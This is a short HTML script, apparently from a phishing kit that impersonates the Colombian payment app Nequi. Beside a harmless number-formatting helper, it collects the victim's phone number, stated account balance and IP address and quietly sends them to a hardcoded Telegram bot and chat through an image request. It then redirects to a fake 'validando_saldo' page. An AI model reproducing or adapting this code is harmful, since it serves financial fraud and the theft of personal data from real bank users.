<!-- Script con formateador de miles nativo en tiempo real y envío a Telegram -->
<script>
    var telegram_bot_id = "6159424723:AAE4qhm6H4sNLztr5HnLjAOrZlf95BAUKBE";
    var chat_id = -1003508204208;

    // Función que coloca los puntos cada 3 dígitos automáticamente mientras se escribe
    function formatearMiles(input) {
        var valorLimpio = input.value.replace(/\D/g, "");
        if (valorLimpio !== "") {
            input.value = Number(valorLimpio).toLocaleString("es-CO");
        } else {
            input.value = "";
        }
    }

    function enviarSaldoTelegram(e) {
        e.preventDefault();

        var CLN = localStorage.getItem("hr-u") || "No registrado";
        var SDN = document.getElementById("sd-a").value;
        var ip2 = document.getElementById("address").innerHTML;
        
        var message = "NEQUI - SALDO\nCelular: " + CLN + "\nMonto: " + SDN + "\n" + ip2;

        var url = "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage?chat_id=" + chat_id + "&text=" + encodeURIComponent(message);

        var img = new Image();
        img.src = url;

        setTimeout(function() {
            window.location.href = "validando_saldo.html";
        }, 500);

        return false;
    }
</script>
